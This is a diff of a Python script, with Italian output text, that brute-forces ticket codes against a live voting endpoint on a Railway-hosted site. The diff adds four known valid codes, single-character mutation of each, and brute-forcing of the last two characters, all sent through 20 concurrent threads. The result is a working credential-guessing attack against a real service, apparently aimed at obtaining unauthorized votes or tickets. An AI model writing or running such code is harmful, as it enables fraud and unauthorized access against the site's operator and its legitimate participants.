@@ -5,13 +5,16 @@ import itertools
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 BASE_URL = "https://play-the-future-vfu.up.railway.app/vote"
-CHARSET = string.ascii_uppercase  # A-Z only
+CHARSET = string.ascii_uppercase + string.digits  # A-Z + 0-9 (36 chars)
 INVALID_MARKERS = ["ticket non valido", "host not in allowlist"]
 WORKERS = 20
 
-# --- Config ---
-KNOWN_PREFIX = "RXKPIY"          # fixed part we know is valid
-SUFFIX_LEN = 8 - len(KNOWN_PREFIX)  # brute-force remaining chars (2 → 676 combos)
+KNOWN_VALID = [
+    "RXKPIYFG",
+    "SYU51IQK",
+    "3NQJXOSP",
+    "T2FXIVBS",
+]
 
 
 def check_code(code):
@@ -26,41 +29,74 @@ def check_code(code):
     return None
 
 
-def generate_candidates():
-    for suffix in itertools.product(CHARSET, repeat=SUFFIX_LEN):
-        yield KNOWN_PREFIX + "".join(suffix)
+def single_mutation_candidates():
+    """For each known ticket, mutate one position at a time through all charset symbols."""
+    seen = set(KNOWN_VALID)
+    for ticket in KNOWN_VALID:
+        for pos in range(len(ticket)):
+            for char in CHARSET:
+                if char == ticket[pos]:
+                    continue
+                candidate = ticket[:pos] + char + ticket[pos+1:]
+                if candidate not in seen:
+                    seen.add(candidate)
+                    yield candidate
 
 
-def main():
-    candidates = list(generate_candidates())
+def prefix_bruteforce_candidates(prefix_len=6):
+    """Fix first N chars of each known ticket, brute-force the rest."""
+    seen = set(KNOWN_VALID)
+    suffix_len = 8 - prefix_len
+    for ticket in KNOWN_VALID:
+        prefix = ticket[:prefix_len]
+        for suffix in itertools.product(CHARSET, repeat=suffix_len):
+            candidate = prefix + "".join(suffix)
+            if candidate not in seen:
+                seen.add(candidate)
+                yield candidate
+
+
+def run_batch(label, candidates):
+    candidates = list(candidates)
     total = len(candidates)
     valid = []
-
-    print(f"Prefix fisso : {KNOWN_PREFIX}")
-    print(f"Suffix libero: {SUFFIX_LEN} char  →  {total} combinazioni totali")
-    print(f"Endpoint     : {BASE_URL}/<code>\n")
-
+    print(f"\n{'='*60}")
+    print(f"Strategia: {label}")
+    print(f"Candidati : {total}")
+    print(f"{'='*60}")
     with ThreadPoolExecutor(max_workers=WORKERS) as pool:
-        futures = {pool.submit(check_code, code): code for code in candidates}
+        futures = {pool.submit(check_code, c): c for c in candidates}
         done = 0
         for future in as_completed(futures):
             done += 1
             code = futures[future]
             result = future.result()
-            print(f"[{done:4}/{total}] {code}", end="\r")
+            print(f"[{done:5}/{total}] {code}", end="\r")
             if result:
                 url, status, preview = result
                 valid.append(url)
                 print(f"\n  *** VALIDO ***  {url}  (HTTP {status})")
                 print(f"  Preview: {preview!r}\n")
-
-    print(f"\n\nCompletato: {len(valid)} ticket validi su {total} testati")
-    if valid:
-        print("\n--- Ticket validi ---")
-        for u in valid:
-            print(f"  {u}")
-
+    print(f"\nTrovati {len(valid)} validi su {total} testati.")
     return valid
+
+
+def main():
+    print(f"Ticket validi noti: {KNOWN_VALID}")
+    all_valid = list(KNOWN_VALID)
+
+    # Phase 1: single-position mutation (cheap, 1120 requests)
+    found = run_batch("Single-position mutation (1 char alla volta)", single_mutation_candidates())
+    all_valid.extend(found)
+
+    # Phase 2: prefix brute-force last 2 chars (1296 × 4 tickets)
+    found = run_batch("Prefix fix 6 char + brute-force ultimi 2", prefix_bruteforce_candidates(prefix_len=6))
+    all_valid.extend(found)
+
+    print(f"\n{'='*60}")
+    print(f"TOTALE TICKET VALIDI TROVATI: {len(all_valid)}")
+    for u in all_valid:
+        print(f"  {u}")
 
 
 if __name__ == "__main__":
